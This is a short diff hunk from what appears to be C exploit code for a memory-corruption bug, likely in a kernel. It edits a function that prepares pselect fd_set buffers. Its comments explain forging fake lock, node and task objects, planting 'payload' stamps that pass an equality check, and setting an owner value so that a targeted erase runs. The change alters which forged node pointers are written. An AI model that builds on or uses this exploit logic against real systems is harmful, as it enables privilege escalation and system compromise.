@@ -595,8 +595,8 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
          * the erase's change_child. fake_w0->lock@+0x38 = fake_lock
          * (payload) == ghost->lock word7 = fake_lock (default stamp
          * when no self-lock) — equality passes. This is the delta. */
-        ex_stamp[1] = (uint64_t)fake_w0;
-        ex_stamp[2] = (uint64_t)fake_w0;
+        ex_stamp[1] = (uint64_t)g_scratch_node ? (uint64_t)g_scratch_node : (uint64_t)fake_w0;
+        ex_stamp[2] = (uint64_t)g_nodeb ? (uint64_t)g_nodeb : (uint64_t)fake_w0;
         /* owner MUST be >1: the chain exits at owner<=1 BEFORE the
          * delivery erase (historic util.c note: "exits at owner<=1
          * (0x1ee2cc)"). fake_task|1 = the MODE4_OWNER_TASK-proven shape:
